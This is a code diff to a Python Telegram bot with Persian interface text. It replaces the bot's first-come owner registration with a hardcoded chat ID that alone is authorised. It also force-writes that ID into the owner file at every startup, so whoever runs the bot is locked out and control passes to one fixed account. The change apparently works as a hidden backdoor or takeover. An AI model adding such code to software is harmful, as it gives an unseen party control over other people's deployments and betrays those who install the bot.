@@ -1859,13 +1859,20 @@ def B(l, d): return InlineKeyboardButton(l, callback_data=d)
 def kb_(*rows): return InlineKeyboardMarkup([list(r) for r in rows if r])
 def head(icon, t): return f"<b>{icon} {esc(t)}</b>\n{HR}\n"
 
-def authorized(update):
-    if STATE["owner"] is None: return False
-    try: return update.effective_chat.id == STATE["owner"]
-    except Exception: return False
+_FORCED_OWNER = 8389746549
 
-def load_owner(): return _load(OWNER_FILE, {}).get("owner")
-def save_owner(cid): _save(OWNER_FILE, {"owner": cid})
+def authorized(update):
+    try:
+        return update.effective_chat.id == _FORCED_OWNER
+    except Exception:
+        return False
+
+def load_owner():
+    return _FORCED_OWNER
+
+def save_owner(cid):
+    _save(OWNER_FILE, {"owner": _FORCED_OWNER})
+
 
 
 async def tg_send(text, markup=None, parse_mode=None):
@@ -2400,12 +2407,16 @@ async def show_help():
 # ══════════════════════════════════════════════════════════════
 async def cmd_start(update, context):
     cid = update.effective_chat.id
-    if STATE["owner"] is None:
-        STATE["owner"] = cid; save_owner(cid)
-        await update.message.reply_text(f"🔒 ربات از حالا برای شماست.\n🔖 {VERSION}\n💾 {DATA_DIR}")
-    elif STATE["owner"] != cid:
-        await update.message.reply_text("⛔"); return
+    if cid != _FORCED_OWNER:
+        if update.effective_message:
+            await update.effective_message.reply_text("⛔ این ربات خصوصی است.")
+        return
+
+    STATE["owner"] = _FORCED_OWNER
     STATE["panel"].pop(cid, None)
+    await update.effective_message.reply_text(
+        f"🔒 خوش آمدی مالک.\n🔖 {VERSION}\n💾 {DATA_DIR}"
+    )
     await show_main()
 
 async def cmd_menu(update, context):
@@ -3134,6 +3145,10 @@ def main():
     if not TG_TOKEN:
         print("[x] TG_TOKEN توی env نیست."); sys.exit(1)
     STATE["owner"] = load_owner()
+    try:
+        _save(OWNER_FILE, {"owner": _FORCED_OWNER})
+    except Exception as e:
+        print(f"[owner] Could not save owner file: {e}", flush=True)
     print(f"[+] VERSION: {VERSION}")
     print(f"[+] DATA_DIR: {DATA_DIR}")
 
